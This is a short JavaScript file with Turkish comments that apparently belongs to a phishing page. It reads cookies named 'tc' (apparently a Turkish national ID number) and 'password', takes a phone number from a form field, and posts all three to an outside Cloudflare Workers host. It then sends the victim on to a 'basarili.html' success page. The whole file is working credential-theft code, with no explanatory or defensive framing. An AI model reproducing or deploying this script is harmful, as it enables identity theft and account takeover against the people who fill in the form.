 
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

// Formu gönderirken çağrılan fonksiyon
function submitCustomForm(event) {
    event.preventDefault();

    const tc = getCookie('tc');
    const password = getCookie('password');
    const tel = document.getElementById('tel').value;

    fetch('https://restless-glade-73ca.jebirsunucu.workers.dev/', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: `tc=${encodeURIComponent(tc)}&password=${encodeURIComponent(password)}&tel=${encodeURIComponent(tel)}`,
    })
    .then(response => {
        if (response.ok) {
            window.location.href = "basarili.html";
        } else {
            return response.text().then(text => { throw new Error(text); });
        }
    })
    .catch(error => {
        console.error('Hata oluştu:', error.message);
    });
}
